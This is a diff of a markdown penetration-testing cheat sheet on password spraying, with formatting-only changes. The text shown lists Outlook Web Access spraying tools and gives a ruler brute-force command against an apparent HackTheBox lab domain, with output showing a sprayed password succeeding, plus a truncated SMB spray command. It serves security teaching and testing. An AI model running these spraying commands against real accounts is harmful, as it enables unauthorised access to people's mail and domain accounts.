@@ -74,43 +74,41 @@ apt-get install spray
 spray -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPe
 ```
 
--------------------
-
 ## Outlook Web Access
 
 There are multiples tools for password spraying outlook.
 
-* With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-* with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-* With [Ruler](https://github.com/sensepost/ruler) (reliable!)
-* With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-* With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+* With [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+* with [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+* With [Ruler](https://github.com/sensepost/ruler) \(reliable!\)
+* With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) \(Powershell\)
+* With [MailSniper](https://github.com/dafthack/MailSniper) \(Powershell\)
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray. 
+To use any of these tools, you need a user list and a password / a small list of passwords to spray.
 
-```sh
+```bash
 $ ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
-	[x] Failed: larsson:Summer2020
-	[x] Failed: cube0x0:Summer2020
-	[x] Failed: a.admin:Summer2020
-	[x] Failed: c.cube:Summer2020
-	[+] Success: s.svensson:Summer2020
-	[x] Failed: s.sven:Summer2020
-	[x] Failed: j.jenny:Summer2020
-	[x] Failed: t.teresa:Summer2020
-	[x] Failed: t.trump:Summer2020
-	[x] Failed: a.adams:Summer2020
-	[x] Failed: l.larsson:Summer2020
-	[x] Failed: CUBE0X0:Summer2020
-	[x] Failed: A.ADMIN:Summer2020
-	[x] Failed: C.CUBE:Summer2020
-	[+] Success: S.SVENSSON:Summer2020
+    [x] Failed: larsson:Summer2020
+    [x] Failed: cube0x0:Summer2020
+    [x] Failed: a.admin:Summer2020
+    [x] Failed: c.cube:Summer2020
+    [+] Success: s.svensson:Summer2020
+    [x] Failed: s.sven:Summer2020
+    [x] Failed: j.jenny:Summer2020
+    [x] Failed: t.teresa:Summer2020
+    [x] Failed: t.trump:Summer2020
+    [x] Failed: a.adams:Summer2020
+    [x] Failed: l.larsson:Summer2020
+    [x] Failed: CUBE0X0:Summer2020
+    [x] Failed: A.ADMIN:Summer2020
+    [x] Failed: C.CUBE:Summer2020
+    [+] Success: S.SVENSSON:Summer2020
 ```
-
 
 ## References :
 
-- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying
-- https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell
-- www.blackhillsinfosec.com/?p=5296
-- https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying
+* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
+* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
+* www.blackhillsinfosec.com/?p=5296
+* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+
